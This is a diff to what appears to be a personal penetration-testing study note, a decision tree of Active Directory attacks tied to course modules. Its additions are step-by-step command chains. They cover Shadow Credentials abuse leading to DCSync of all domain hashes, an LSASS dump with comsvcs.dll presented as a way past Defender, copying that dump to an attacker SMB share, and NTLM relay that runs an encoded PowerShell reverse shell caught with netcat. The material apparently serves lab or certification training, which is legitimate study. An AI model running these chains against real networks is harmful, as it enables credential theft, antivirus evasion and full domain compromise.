@@ -1,6 +1,6 @@
 # Active Directory (Decision Tree)
 
-Symptom-ordered routing for AD attack decisions. Full command syntax in [[Active Directory]], phase-ordered methodology in [[Active Directory Methodology]], teardowns in [[Active Directory (Breakdowns)]].
+Symptom-ordered routing for AD attack decisions. Full command syntax in [[Active Directory]], phase-ordered methodology in [[Active Directory Methodology]], teardowns in [[Active Directory (Breakdowns)]]. The core module arc starts at [[22. Active Directory Introduction and Enumeration]]; see also [[23. Attacking Active Directory Authentication]] and [[24. Lateral Movement in Active Directory]].
 
 ---
 
@@ -23,7 +23,7 @@ Always check password policy first: crackmapexec smb <DC> -u user -p pass --pass
 → If lockout threshold ≥ 3: stay at 1-2 attempts per account per observation window
 ```
 
-Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.5. Password Spraying from Windows. DomainPasswordSpray|AD.5]], [[Active Directory Methodology#Step 1.5: Password Policy|Policy check]], [[Active Directory Methodology#Step 2: Password Spraying|Phase 2 Step 2]]
+Full reference: [[22. Active Directory Introduction and Enumeration|AD.5]], [[Active Directory Methodology#Step 1.5: Password Policy|Policy check]], [[Active Directory Methodology#Step 2: Password Spraying|Phase 2 Step 2]]
 
 ---
 
@@ -92,7 +92,7 @@ WriteOwner on an object:
   → Then WriteDACL → add GenericAll → proceed
 ```
 
-Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.9.3. Common Exploitable Rights|AD.9.3 rights table]], [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.10. ACL Abuse Chain|AD.10 full chain]]
+Full reference: [[22. Active Directory Introduction and Enumeration|AD.9.3 rights table]], [[22. Active Directory Introduction and Enumeration|AD.10 full chain]]
 
 ---
 
@@ -139,7 +139,7 @@ Linux shortcut (automated):
   impacket-raiseChild -target-exec DC01.PARENT.LOCAL CHILD.PARENT.LOCAL/Admin:pass
 ```
 
-Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.15. Domain Trusts|AD.15 trust types]], [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.16. Child→Parent Trust Attack (Windows. ExtraSids)|AD.16]], [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.17. Child→Parent Trust Attack (Linux, raiseChild.py)|AD.17]]
+Full reference: [[22. Active Directory Introduction and Enumeration|AD.15 trust types]], [[22. Active Directory Introduction and Enumeration|AD.16]], [[22. Active Directory Introduction and Enumeration|AD.17]]
 
 ---
 
@@ -163,7 +163,7 @@ Options:
      evil-winrm -i <foreign_host> -u 'FOREIGN.LOCAL\user' -p pass
 ```
 
-Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.18. Cross-Forest Trust Abuse (Windows)|AD.18]], [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.19. Cross-Forest Trust Abuse (Linux)|AD.19]]
+Full reference: [[22. Active Directory Introduction and Enumeration|AD.18]], [[22. Active Directory Introduction and Enumeration|AD.19]]
 
 ---
 
@@ -182,7 +182,7 @@ Why it works: MachineAccountQuota allows creating machine accounts; machine acco
 its sAMAccountName to match a DC name; KDC fallback logic then issues a DC-level PAC.
 ```
 
-Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.13. Bleeding Edge: NoPac (CVE-2021-42278 + CVE-2021-42287)|AD.13]]
+Full reference: [[22. Active Directory Introduction and Enumeration|AD.13]]
 
 ---
 
@@ -210,7 +210,7 @@ Folders named "do-not-share" / "private" / "confidential":
   → Almost always misconfigured — open them first
 ```
 
-Full reference: [[Active Directory Introduction and Enumeration#22.3.5 Enumerating Domain Shares|Module 22 §22.3.5]], [[Active Directory#Domain Shares & SYSVOL|Command Appendix]]
+Full reference: [[22. Active Directory Introduction and Enumeration#22.3.5 Enumerating Domain Shares|Module 22 §22.3.5]], [[Active Directory#Domain Shares & SYSVOL|Command Appendix]]
 
 ---
 
@@ -238,11 +238,64 @@ GenericAll on a USER (e.g. robert):
     → Rubeus kerberoast /user:<user> /nowrap → hashcat -m 13100
     → Cleanup: Set-DomainObject -Credential $Cred -Identity <user> -Clear serviceprincipalname
 
+  Alternative Option 3 — Shadow Credentials (GenericWrite or GenericAll, if ADCS in domain):
+    # From Kali, writes msDS-KeyCredentialLink on the target object
+    pywhisker add -d corp.com -u attacker -p 'pass' --target <target_user> --filename shadow
+    python3 gettgtpkinit.py corp.com/<target_user> -cert-pfx shadow.pfx -pfx-pass <pfxpass> shadow.ccache
+    export KRB5CCNAME=shadow.ccache
+    python3 getnthash.py corp.com/<target_user> -key <session_key_from_above>
+    evil-winrm -i <target_ip> -u <target_user> -H <recovered_NTLM>
+    # Result: full NTLM hash without touching LSASS → use for PtH or evil-winrm /H
+
 Note: PSCredential chain needed only when you are NOT already running as the account that holds the ACE.
 If you ARE that account (e.g. you're running as stephanie who has GenericAll), net group/net user work directly.
 ```
 
-Full reference: [[Active Directory Introduction and Enumeration#22.3.4 Enumerating Object Permissions|Module 22 §22.3.4]], [[Active Directory (Decision Tree)#I have an ACE on a target object, what attack applies?|Decision Tree: ACE attacks]]
+Full reference: [[22. Active Directory Introduction and Enumeration#22.3.4 Enumerating Object Permissions|Module 22 §22.3.4]], [[Active Directory (Decision Tree)#I have an ACE on a target object, what attacks applies?|Decision Tree: ACE attacks]], [[Active Directory (Decision Tree)#I have GenericWrite or GenericAll on a computer account — Shadow Credentials path|Decision Tree: Shadow Credentials]]
+
+---
+
+## I have GenericWrite or GenericAll on a computer account — Shadow Credentials path
+
+```
+Shadow Credentials abuses msDS-KeyCredentialLink (a cert-auth attribute writable with GenericWrite).
+Works on USER accounts too, but most powerful on COMPUTER accounts → yields NTLM as SYSTEM.
+
+Prerequisites:
+  - GenericWrite or GenericAll on target (user or computer object)
+  - ADCS present in the domain (needed for PKINIT cert auth; check: Get-ADObject -Filter {ObjectClass -eq "pKIEnrollmentService"})
+  - pywhisker + PKINITtools installed on Kali
+
+Attack chain (computer account example — gives SYSTEM NTLM for that host):
+  1. pywhisker add -d corp.com -u attacker -p 'pass' --target DC01$ --filename shadow_dc
+     # Outputs: shadow_dc.pfx and shadow_dc.pem, plus the PFX password
+  2. python3 gettgtpkinit.py corp.com/DC01$ -cert-pfx shadow_dc.pfx -pfx-pass <pfxpass> shadow_dc.ccache
+     # Outputs: session key (copy it)
+  3. export KRB5CCNAME=shadow_dc.ccache
+  4. python3 getnthash.py corp.com/DC01$ -key <session_key>
+     # Outputs: NTLM hash of the machine account
+  5. secretsdump.py -hashes :<machine_NTLM> 'corp.com/DC01$@<DC_IP>'
+     # Machine accounts can DCSync — dumps all domain hashes
+
+Attack chain (user account example):
+  Same steps 1-4 targeting <username> instead of <machine$>
+  5. evil-winrm -i <target_ip> -u <username> -H <user_NTLM>
+     # or: impacket-psexec -hashes :<NTLM> corp.com/<username>@<target_ip>
+
+Cleanup (after attack — remove the injected key):
+  pywhisker remove -d corp.com -u attacker -p 'pass' --target <target> --device-id <id_from_add_output>
+
+ADCS ESC8 variant (if HTTP enrollment endpoint is up):
+  # Use impacket-ntlmrelayx targeting the ADCS web endpoint instead:
+  impacket-ntlmrelayx -t http://<ADCS_IP>/certsrv/certfnsh.asp -smb2support --adcs --template "DomainController"
+  # Trigger NTLM auth from the target (e.g. via SpoolSample / PetitPotam)
+  # Relay gives a base64 cert → Rubeus asktgt /certificate:<b64> /password: /domain: /dc: /ptt
+
+oscrypto fix if pywhisker crashes:
+  pip3 install 'oscrypto @ git+https://github.com/wbond/oscrypto.git'
+```
+
+Full reference: [[23. Attacking Active Directory Authentication#Shadow Credentials|Module 23 Shadow Credentials]], [[Active Directory#Shadow Credentials (pywhisker + PKINITtools)|AD Command Appendix]]
 
 ---
 
@@ -355,7 +408,7 @@ High Mandatory Level = elevated. SYSTEM Mandatory Level = SYSTEM.
 ⚠️ Don't use PsExec or net use \\target\ADMIN$ from the filtered session — they'll fail.
 ```
 
-Full reference: [[Lateral Movement in Active Directory#Capstone Lessons|Module 24 Capstone Lessons]]
+Full reference: [[24. Lateral Movement in Active Directory#Capstone Lessons|Module 24 Capstone Lessons]]
 
 ---
 
@@ -387,8 +440,79 @@ Group 0 = TGS (service-specific), Group 2 = TGT (domain-wide). The number after
 the second dash in the filename: 0-0 = TGS, 2-0 = TGT.
 ```
 
-Full reference: [[Lateral Movement in Active Directory#24.1.5 Pass the Ticket (PtT)|Module 24 §24.1.5]]
+Full reference: [[24. Lateral Movement in Active Directory#24.1.5 Pass the Ticket (PtT)|Module 24 §24.1.5]]
 
 ---
 
-#### Tags: #DecisionTree #ActiveDirectory #ADEnum #PasswordSpray #ACLAbuse #DCSync #SilverTicket #Kerberoasting #KerberosClockSkew #DomainTrust #ExtraSids #NoPac #CrossForest #BloodHound #HTBSupplementary #Module22 #Module23 #SYSVOL #GPP #GenericAll #DomainShares #LateralMovement #PassTheTicket #UACFiltering #Module24
+## I have SYSTEM on a Windows target but Meterpreter kiwi / sekurlsa::logonpasswords is killed by Defender
+
+```
+Defender's AMSI/real-time catches kiwi's driver load and kills the session.
+Symptoms: Meterpreter session opens cleanly, `load kiwi` kills the session immediately.
+
+Use comsvcs.dll MiniDump instead — dumps LSASS via a Microsoft-signed DLL, not flagged:
+
+Step 1 — get LSASS PID:
+  Get-Process lsass      (from nc/WinRM shell)
+
+Step 2 — dump LSASS to disk:
+  rundll32 C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\Windows\Temp\lsass.dmp full
+  (silent on success; check dir for ~45-50 MB file)
+
+Step 3 — host authenticated SMBserver on Kali (kill ntlmrelayx first — it holds port 445):
+  mkdir /tmp/share
+  impacket-smbserver share /tmp/share -smb2support -username kali -password kali
+
+Step 4 — mount and copy from Windows:
+  net use \\<KALI>\share /user:kali kali
+  copy C:\Windows\Temp\lsass.dmp \\<KALI>\share\lsass.dmp
+
+Step 5 — parse offline on Kali:
+  pypykatz lsa minidump /tmp/share/lsass.dmp
+  Look for: username + NT: <hash> + password: <cleartext> under target account
+
+Constraints: requires SYSTEM on target (SeDebugPrivilege needed to dump LSASS).
+Null-auth smbserver (no -username/-password) is blocked by modern Windows — always authenticate.
+```
+
+Full walkthrough: [[27. Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1|Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1]]
+Breakdown: [[Active Directory (Breakdowns)#rundll32 comsvcs.dll MiniDump]], [[Active Directory (Breakdowns)#pypykatz lsa minidump]]
+
+---
+
+## I found an app that lets me set an outbound UNC/file path — can I relay NTLM?
+
+```
+Any app feature that triggers an outbound SMB connection to an attacker-controlled UNC path
+can be weaponised for NTLM relay when the relay TARGET has SMB signing disabled.
+
+Pattern:
+  1. Find an app with a configurable path (backup plugin, printer driver config, image URL, file share sync)
+  2. Set the path to //KALI_IP/anythingfake
+  3. The server tries to authenticate to Kali's SMB listener — ntlmrelayx catches it
+  4. ntlmrelayx relays those credentials to a target with SMB signing OFF
+  5. If the source account is admin on the target → arbitrary command execution
+
+Common trigger points:
+  • WordPress Backup Migration plugin → backup directory path
+  • Any printer administration page with a UNC "test page" path
+  • Any "load remote resource" feature in web apps that runs server-side
+  • Responder (poisons LLMNR/NBT-NS → any failed name lookup becomes a trigger)
+
+Check SMB signing before setting up:
+  crackmapexec smb <targets> --gen-relay-list relayable.txt
+  (lists all hosts with signing:False — safe relay targets)
+
+Setup:
+  sudo impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c "powershell -enc <B64>"
+  nc -nvlp 9999   ← catch the shell
+
+For payload generation: RevShells.com → PowerShell Base64 (LHOST/LPORT) → paste into -enc arg
+```
+
+Full walkthrough: [[27. Assembling the Pieces#27.5.2 NTLM Relay via WordPress Backup Migration Plugin|Assembling the Pieces#27.5.2 NTLM Relay via WordPress Backup Migration Plugin]]
+Breakdown: [[Active Directory (Breakdowns)#impacket-ntlmrelayx — full NTLM relay chain with -c command execution]]
+
+---
+
+#### Tags: #DecisionTree #ActiveDirectory #ADEnum #PasswordSpray #ACLAbuse #DCSync #SilverTicket #Kerberoasting #KerberosClockSkew #DomainTrust #ExtraSids #NoPac #CrossForest #BloodHound #HTBSupplementary #Module22 #Module23 #SYSVOL #GPP #GenericAll #DomainShares #LateralMovement #PassTheTicket #UACFiltering #Module24 #NTLMRelay #comsvcs #MiniDump #pypykatz #Defender #AVBypass #Module27
